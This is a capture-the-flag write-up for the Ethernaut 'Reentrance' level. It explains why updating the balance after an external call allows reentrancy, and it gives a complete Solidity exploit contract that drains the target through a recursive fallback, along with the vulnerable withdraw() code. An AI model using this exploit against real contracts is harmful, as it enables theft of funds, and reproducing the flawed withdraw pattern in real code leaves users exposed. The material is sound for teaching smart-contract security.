In the `withdraw()` function, we can see that the withdraw is processed using the `call` method, and our balance is not updated until after this call. The `call` method forwards all gas by default and allows code to be executed. No data is sent with this call, just Ether. This means the call will trigger a fallback function if one exists. If this fallback function itself calls the contracts `withdraw` function, we can again withdraw the same amount of Ether before our balance is updated.

Therefore, all funds (which total 1 Ether, as shown by `web3.eth.getBalance`) from this contract can be drained with another contract. The steps to do this are:

1. Donate 1 Ether to our contract's address using the Reentrance contract's `donate()` function
    * By donating an amount equal to the contract balance, we'll only need to call the `withdraw()` function twice &mdash; once to withdraw our own contribution, and a second time to withdraw the remaining balance

2. Call the `withdraw()` function
3. Step 2 triggers our fallback function, which then calls `withdraw()` with an input equal to the contract's remaining balance of 1 Ether, successfully draining the contract
    * Make sure to limit the number of times our fallback function is called, so we don't end up in a loop that runs out of gas.

We can do this with the contract below. Note that we can remove the need to use the Reentrance source code by instead directly obtaining the methods IDs and passing them into `call`, e.g.  `reentranceAddress.call(bytes4(keccak256("withdraw(uint)")));`

```javascript
pragma solidity ^0.4.18;

// Copy Ethernaut contract =====================================================
contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}


// Our contract ================================================================
contract Exploit {

  // Create instance of Reentrance contract
  address reentranceAddress = 0xc1287929edc17a7cdbe5ba6cb05a013d86ffb31f;
  Reentrance reentranceContract = Reentrance(reentranceAddress);

  // Keep track of withdraw() calls to prevent infinite loop
  uint numWithdrawCalls = 0;

  // Donate to our own address
  function donateToOurselves() public payable {
    reentranceContract.donate.value(msg.value)(address(this));
  }

  // Begin reentrancy attack by calling withdraw
  function beginAttack() public {
      reentranceContract.withdraw(1 ether);
  }

  // Define fallback function
  function() public payable {

    // In this case we only need to call the withdraw function once
    if (numWithdrawCalls < 1) {
      reentranceContract.withdraw(1 ether);
      numWithdrawCalls += 1;
    }
  }
}

```


_Note: If calling the `beginAttack()` function with MetaMask, you may need to manually change the gas limit from the confirmation dialog_